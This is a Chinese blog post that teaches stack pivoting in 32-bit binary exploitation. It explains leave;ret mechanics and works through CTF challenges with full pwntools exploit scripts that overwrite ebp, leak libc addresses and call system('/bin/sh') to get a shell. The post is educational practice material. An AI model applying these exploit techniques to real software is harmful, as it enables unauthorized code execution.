<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zikh26.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":"ture","version":"8.17.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>

    <meta name="description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:type" content="website">
<meta property="og:title" content="ZIKH26&#39;s Blog">
<meta property="og:url" content="https://zikh26.github.io/page/6/index.html">
<meta property="og:site_name" content="ZIKH26&#39;s Blog">
<meta property="og:description" content="万古凡间一过客，九天之上第一仙">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZIKH26">
<meta property="article:tag" content="CTF PWN IT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="https://zikh26.github.io/page/6/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":true,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"page/6/index.html","title":""}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>ZIKH26's Blog</title>
  








  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">ZIKH26's Blog</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
  </ul>
</nav>




</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-overview-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="ZIKH26"
      src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
  <p class="site-author-name" itemprop="name">ZIKH26</p>
  <div class="site-description" itemprop="description">万古凡间一过客，九天之上第一仙</div>
</div>
<div class="site-state-wrap animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">98</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">100</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>

        </div>
      </div>
    </div>

    
  </aside>


    </div>

    <div class="main-inner index posts-expand">

    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/ee1dcd7f.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307011626843.jpg">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/ee1dcd7f.html" class="post-title-link" itemprop="url">关于栈迁移的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:38:41" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="1、什么是栈迁移"><a href="#1、什么是栈迁移" class="headerlink" title="1、什么是栈迁移"></a>1、什么是栈迁移</h1><p>  这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是换个地方控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面）。</p>
<h1 id="2、为什么要使用栈迁移-amp-amp-什么时候该使栈迁移（使用栈迁移的条件）"><a href="#2、为什么要使用栈迁移-amp-amp-什么时候该使栈迁移（使用栈迁移的条件）" class="headerlink" title="2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）"></a>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h1><p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p>
<p>使用栈迁移的条件：</p>
<p>1、要能够栈溢出，这点尤其重要，最起码也要溢出覆盖个ebp</p>
<p>2、需要有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</p>
<h1 id="3、学习栈迁移需要自身掌握什么知识"><a href="#3、学习栈迁移需要自身掌握什么知识" class="headerlink" title="3、学习栈迁移需要自身掌握什么知识"></a>3、学习栈迁移需要自身掌握什么知识</h1><pre><code>①需要掌握汇编基础
②较为熟悉栈结构
③以及明白函数调用与结束时栈的变化
</code></pre>
<p>PS：本文讨论的一切原理，都是针对于32位程序的栈迁移来说的，不过例题里面有一道是64位的栈迁移</p>
<h1 id="4、栈迁移的原理"><a href="#4、栈迁移的原理" class="headerlink" title="4、栈迁移的原理"></a>4、栈迁移的原理</h1><h3 id="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系）"><a href="#ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系）" class="headerlink" title="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系）"></a><font color=red>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系）</font></h3><p><img src="/../img/2706180-20220118102346730-1500206355.png"></p>
<p>ebp是0xffe7a9e8，它的内容是0xffe7aa38，而这个内容也是一个地址，这个地址里面装的又是0x8059b50。<u>ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）</u>。我这里想强调的是ebp和ebp的内容这两者一定不能混为一谈，在阅读下面的内容是，一定要注意区分两者。</p>
<h2 id="栈迁移的核心，就在于两次的leave-ret指令上面"><a href="#栈迁移的核心，就在于两次的leave-ret指令上面" class="headerlink" title="栈迁移的核心，就在于两次的leave;ret指令上面"></a><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h2><h3 id="在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave-ret，容易搞迷了）。"><a href="#在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave-ret，容易搞迷了）。" class="headerlink" title="(在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave;ret，容易搞迷了）。"></a>(在说明栈迁移原理之前，我先介绍一下leave和ret具体是在干什么，这里建议仔细看一下，不然后面连续两个leave;ret，容易搞迷了）。</h3><p>leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp<font color=red>（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）</font>。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图。<font color=red><strong>ps:下面几张图片，当时制作的时候，有点粗心，把leave写成level了，因此读的时候注意下这里就好了。</strong></font></p>
<p><img src="/../img/2706180-20220118102443458-1381923387.png"></p>
<pre><code>ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图。
</code></pre>
<p><img src="/../img/2706180-20220118102755803-79970067.png"></p>
<h2 id="栈迁移原理："><a href="#栈迁移原理：" class="headerlink" title="栈迁移原理："></a>栈迁移原理：</h2><p><strong>（先讨论main函数里的栈迁移）</strong>首先<strong>利用溢出把ebp的内容</strong>给修改掉（<strong>修改成我们要迁移的那个地址</strong>），并且<strong>把返回地址填充成leave;ret指令的地址（因为我们需要两次leave;ret）</strong>（如果不会找指令地址的话，本文最后的附录中，有介绍）此时main函数准备结束。</p>
<p><font color=red>开始执行第一个leave</font>，此时mov esp ebp让两个指针处于同一位置，现在还是正常运行，接着执行pop ebp就出现了异常，<u>因为此时ebp的内容被修改成了要迁移的地址</u>，因此执行了pop ebp，ebp并没有弹到它本应该去的地方（正常情况下，ebp里装的内容，就是它接下来执行pop ebp要去的地方），<u>而是弹到了我们修改的那个迁移后的地址</u>，接着执行了pop eip，eip里放的又是leave的地址（因为此时是把返回地址弹给eip，这个返回地址，我们先给覆盖成leave;ret的地址。<font color=red>你可能会问，如果这个返回地址不放成leave；ret的地址，行不行？很明显是不行的，因为我们想要实现栈迁移，就必须执行两个leave；ret，main函数正常结束，只有一个level;ret，因此我们在这里必须要它的返回地址写成leave;ret地址，以来进行第二次leave;ret</font>），结果又执行了leave<font color=red>（现在执行第二个leave)</font>，此时才是到了栈迁移的核心部分，<strong>mov esp ebp，ebp赋给了esp，此时esp挪到了ebp的位置，可你别忘了，现在的ebp已经被修改到了我们迁移后的地址，因此现在esp也到了迁移后的地址，接着pop ebp，把这个栈顶的内容弹给ebp，esp指向了下一个内存单元，此时我们只需要将这个内存单元放入system函数的地址，最后执行了pop eip，此时system函数进入了eip中，我们就可以成功GetShell了</strong>。结合描述过程与下图分析，效果更佳！（下图栈中填充的aaaa以及system_addr和&#x2F;bin&#x2F;sh等等，都是payload一起发送过去的，最后的两个aaaa仅仅是起到了一个填充的效果）当然，具体的payload都是根据题目来分析的，这里我只是举个例子。</p>
<p><img src="/../img/2706180-20220118102850680-2070302005.png"></p>
<p><img src="/../img/2706180-20220118103002284-1311363088.png"></p>
<p>最后来总结一下原理，核心是利用两次的leave;ret，<strong>第一次leave ret;将ebp给放入我们指定的位置（这个位置的就是迁移后的所在位置）</strong>，<strong>第二次将esp也迁移到这个位置，并且pop ebp之后，esp也指向了下一个内存单元（此时这里放的就是system函数的plt地址）</strong>，最终成功GetShell。</p>
<p>原理如上，遇见不同栈迁移的题目也是根本核心万变不离其宗。</p>
<h1 id="5、栈迁移的实战运用"><a href="#5、栈迁移的实战运用" class="headerlink" title="5、栈迁移的实战运用"></a>5、栈迁移的实战运用</h1><p>接下来是有四道栈迁移的题目来练习。分别是</p>
<p>攻防世界上的greeting-150</p>
<p>BUUCTF上的[Black Watch 入群题]</p>
<p>BUUCTF上的ciscn_2019_es_2</p>
<p>BUUCTF上的gyctf_2020_borrowstack</p>
<p>它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。在这里，我分别也给出他们的wp。</p>
<hr>
<h2 id="BUUCTF上的ciscn-2019-es-2"><a href="#BUUCTF上的ciscn-2019-es-2" class="headerlink" title="BUUCTF上的ciscn_2019_es_2"></a>BUUCTF上的ciscn_2019_es_2</h2><p><img src="/../img/2706180-20220118103554143-806908519.jpg"><img src="/../img/2706180-20220118103707874-2116954617.jpg"></p>
<p>这里我们发现了溢出点。Read读入到s的这个地方，距离ebp只有0x28个字节，可是两个read都可以写入0x30个字节的内容，也就是说可以溢出覆盖ebp和返回地址。</p>
<p><img src="/../img/2706180-20220118103715766-1605737103.png"></p>
<p>我们还发现了后门函数，但是没有参数。</p>
<p><img src="/../img/2706180-20220118120250348-503674972.jpg"></p>
<p>那现在大概思路就是，我们要用第一个read来泄露下ebp的地址***（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x30个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了***），然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），参数分布参考上图</p>
<p>为什么要拿到ebp地址呢，看上图的&#x2F;bin&#x2F;sh地址，我们怎么知道它的地址是什么呢，我们不知道，但是我们知道它距离ebp的偏移（通过IDA的栈图可以数出来），因此我们需要获得ebp的值，配合偏移来表达出这个地址，***这里要尤其注意这个ebp是main函数的，因为printf是打印内存单元里的内容，ebp确实是指向了vul的栈底，但是ebp里面装的内容可是main函数的栈底，因此这个ebp是main函数的栈底***。至于这个0x28怎么来的呢？</p>
<p>这里要用gdb调试一下，断点下到哪无所谓，主要就是要看vul函数快结束的时候，看下栈图。</p>
<p><img src="/../img/2706180-20220118120659280-353618504.jpg"></p>
<p>当然，你实际做题的时候，肯定是看不见&#x2F;bin&#x2F;sh装到哪了，不过没事，在IDA里面我们分析一下，然后看一下它装在哪了，还是这个图，发现&#x2F;bin&#x2F;sh装在了距离栈顶是有四个内存单元的距离，然后再到gdb上去数一下，也就是我们的字符串会存到0xffd9d730这个位置，然后用0xffded758减去这个0xffd9d730，就能得到这个偏移0x28了。</p>
<p><img src="/../img/2706180-20220118120250348-503674972.jpg"></p>
<p>最后的exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,25986)</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="number">0x20</span>*<span class="string">&#x27;a&#x27;</span>+<span class="number">0x8</span>*<span class="string">&#x27;b&#x27;</span></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">level_ret_addr=<span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">sys_addr=e.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)<span class="comment">#第一次仅仅就是为了泄露main函数的ebp</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ebp=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload2=(<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0xffd9d730</span>)+<span class="string">&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>)+p32(ebp-<span class="number">0x38</span>)+p32(level_ret_addr)<span class="comment">#这个ljust的意思是说不足0x28的部分补成00（也就是我在上图中标注的垃圾数据）这个0x38的偏移算法和上面那个0x28是相同的，这个地址是栈顶的地址，也就是我们payload中aaaa的地址，要用这个地址去覆盖ebp</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="攻防世界上的greeting-150"><a href="#攻防世界上的greeting-150" class="headerlink" title="攻防世界上的greeting-150"></a>攻防世界上的greeting-150</h2><p><img src="/../img/2706180-20220118121000718-655614088.jpg"></p>
<p>这里表面上是看开了canary，但是在主要的函数中，没有发现canary的影子，因此，这个canary保护，在这里是有点迷惑性的，我们可以去溢出。</p>
<p><img src="/../img/image-20221007101237565.png" alt="image-20221007101237565"></p>
<p> 在上图中标注了，base64decode，是将解码后的内容放在了v4里面，而不是v6里面，v6里放的是解码后的字符串长度。</p>
<p> 我之前看师傅们的wp一直纳闷，这输入的内容也没有被编码过，咋就到这里可直接就解码了，最后看到了exp才明白，原来是我们发送payload时候，我们自己去编码…，配合这个信息，我也就明白了，原来v6&gt;0xc的这个限制，是说我们payload只能发送12个字节。</p>
<p>执行了这句之后，我们的input里面放的也是解码之后的内容了（因为我们是要把payload编码之后发送，因此这里的input实际上就是我们的payload)<br><font color=red><br>现在input里面就是payload，这个payload只能发送12个字节</p>
</font>


<p>ok，我们继续去看auth这个函数。</p>
<p><img src="/../img/image-20221007101316583.png" alt="image-20221007101316583"></p>
<p>  找到了溢出点，在这里。[ebp-8h]的意思是说，这个v4距离ebp有八个字节的距离，可是input里面可以装12个字节，现在memcpy就可以把input的内容复制给了v4（这个v4和main函数里的v4不是一码事） 只能装8个字节，但是复制了12个字节过去，有什么好说的，溢出就完事了。但是只能溢出覆盖ebp，<font color=red><strong>之前栈迁移的时候，我们为了凑齐两次leave;ret都是将main函数的返回地址写成leave,ret的地址，但是这道题我们没法写到返回地址上，怎么办，我们没办法凑够两次leave;ret了么，不不不，别忘了我们现在可不在main函数还是在auth函数里面，当auth函数结束的时候也会执行一次leave;ret再加上main函数结束的一次leave;ret，因此我们也凑够了两次leave;ret。</strong></font></p>
<p>我们需要换到哪个地方去执行后门函数呢？没错，就是刚才说的input</p>
<p><img src="/../img/image-20221007101341015.png" alt="image-20221007101341015"></p>
<p>这里也可以看到input是处于bss段的。</p>
<p> 现在我们来看这道题，我们可以往input里面输入12个字节，那假设我输入的是aaaabbbbcccc，<font color=red>（并且这个cccc是aaaabbbbcccc这个字符串的首地址）。</font></p>
<p>那么现在栈里就是这么个情况<br><img src="../img/image-20221007101352060.png" alt="image-20221007101352060" style="zoom:50%;" /></p>
<p>当执行到leave的时候，mov esp ebp，此时的esp是cccc了，然后ebp原本该回到正常的main函数的栈底，可是现在它来到了cccc的这个地址（因为执行了auth函数中的leave ret，这里才是核心点）（并且要注意的是ebp内容和ebp是两个东西，ebp的内容装什么都可以，但是ebp本身只能去指向地址）（即此时是ebp指向了aaaa的地址，上面说了cccc的地址是指向的aaaa所处位置）。</p>
<p>现在程序继续运行，因为函数的返回地址是正常的，所以它还是回到了main函数里，它又开始往下运行，直到main函数结束了，它开始执行leave，那么此时我们又一次mov esp ebp；esp成了aaaa的地址，这个时候又进行了pop ebp，那么esp成了bbbb，最后到ret的时候，pop eip，此时就会把栈顶的bbbb，弹入eip去执行了。</p>
<p>如果感觉我说的太抽象了，没有图片的话，可以参考这个师傅的文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43868725/article/details/108366539?ops_request_misc=%7B%22request_id%22:%22164229926316780265467309%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=164229926316780265467309&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-108366539.first_rank_v2_pc_rank_v29&utm_term=format2&spm=1018.2226.3001.4187">(24条消息) format2(xctf)_whiteh4nd的博客-CSDN博客</a>，他这里面最后画的三张图片，描述的很清楚，我上面的叙述过程，跟他图片表达的是一个意思。</p>
<p>最后，我们拐过来看一下，eip执行了bbbb，那我们把bbbb换成后门函数的地址不就ok了，然后是cccc的这个地址，不就是我们这道题的input地址么，input本身能装12个字节，把它本身的地址写到cccc，就是12个字节的最后4字节，这样不就把栈迁移到input的内容里了么（但事实上栈没有过去，毕竟这里可是bss段）</p>
<p>Exp编写很简单</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;111.200.241.244&#x27;</span>,<span class="number">59650</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=<span class="number">0x08049284</span></span><br><span class="line"></span><br><span class="line">input_addr=<span class="number">0x0811EB40</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(input_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>至此本题也就结束了。</p>
<p>但通过这道题，我学到了不少的东西。</p>
<p>尤其是这个函数</p>
<img src="../img/2706180-20220118123108947-994146250.jpg" alt="EJnn.jpg" border="0">

<p>这里我一直是在想怎么把input写成这个-559038737，而忘记了其实不必循规蹈矩，因为没开pie，我们完全可以把这个system函数的地址去弄到eip里面使其执行。也认识到了找漏洞点的重要性，上来就去仔细分析函数的功能用处不大，大致扫过即可，先去找明显的漏洞点，在围绕这个漏洞点想一下，我们能利用它做些什么。</p>
<hr>
<hr>
<h2 id="BUUCTF上的-Black-Watch-入群题"><a href="#BUUCTF上的-Black-Watch-入群题" class="headerlink" title="BUUCTF上的[Black Watch 入群题]"></a>BUUCTF上的[Black Watch 入群题]</h2><img src="../img/2706180-20220118123108942-1379753087.jpg" alt="E2mG.jpg" border="0">



<pre><code>打开IDA发现，主程序中，buf距离栈底有0x18个字节，但是最后的一个read却可以读入0x20个字节，很明显这里存在溢出，但是吧，这个溢出的长度也是很尴尬的，我们确实可以填入system函数地址，但是这样就没办法传参数了，而且我们发现程序里也没有system函数，因此肯定还是要泄露函数地址，用libc里面的system获取shell。

我们发现这里的溢出刚好可以覆盖ebp和返回地址，很明显这里要用栈迁移。然后我们再看下第一个read把输入的内容储存到哪了
</code></pre>
 <img src="../img/2706180-20220118123108938-1447621027.jpg" alt="EfG9.jpg" border="0">



<p>发现是存到了bss段。</p>
<p>那我们的思路大概就出来的，首先把在第一次输入中read去把write_plt的地址和它的参数存进去，因为我们想要system函数地址肯定是需要先泄露libc基地址的。然后第二次输入去把ebp给改成bss段的地址，然后把返回地址改成leave,ret地址（具体原因参考栈迁移原理）</p>
<p>然后程序从main函数返回的时候，被劫持到了bss段，去执行了write函数，泄露出来write函数的got地址，<strong>并且把它的返回地址填写成main函数</strong>，因为我们需要再让程序跑一次，毕竟我们最终可是要去执行system函数的，现在只是把libc基地址给泄露出来了而已。</p>
<p>现在执行完了write函数，然后返回到main函数重新获得了两次输入的机会，那么我们依然如法炮制，在第一次输入中存入system函数地址和它的参数，此时各单位以就位，就差了修改ebp了，然后来到了第二次输入，我们先填充垃圾数据，直到填充至ebp，然后把ebp的地址写成bss段的地址，还要把返回地址写成leave;ret的地址。</p>
<p>最后main函数返回的时候就进行了栈迁移，来到了我们步骤的bss段，然后执行system函数，成功GetShell。</p>
<p>以上只是介绍了本题的思路，但是没有探究原理，具体原理参考前面的栈迁移原理部分。</p>
<p>本题的exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27917</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=e.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">write_got=e.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">read_plt=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x08048513</span></span><br><span class="line"></span><br><span class="line">payload1=<span class="string">&#x27;aaaa&#x27;</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>) <span class="comment">#前面的是bss段地址，后面这个地址是level;ret地址</span></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">obj=LibcSearcher(<span class="string">&#x27;write&#x27;</span>,write_addr)</span><br><span class="line"></span><br><span class="line">libc_base=write_addr-obj.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sys_addr=libc_base+obj.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr=libc_base+obj.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What is your name?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload3=<span class="string">&#x27;aaaa&#x27;</span>+p32(sys_addr)+p32(<span class="number">0</span>)+p32(bin_sh_addr)</span><br><span class="line"></span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;What do you want to say?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload4=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(<span class="number">0x0804A300</span>)+p32(<span class="number">0x08048511</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里有一个很重要的点，一定要注意，就是这里第二次输入的时候，必须要用send去发送，不能用sendline发送</p>
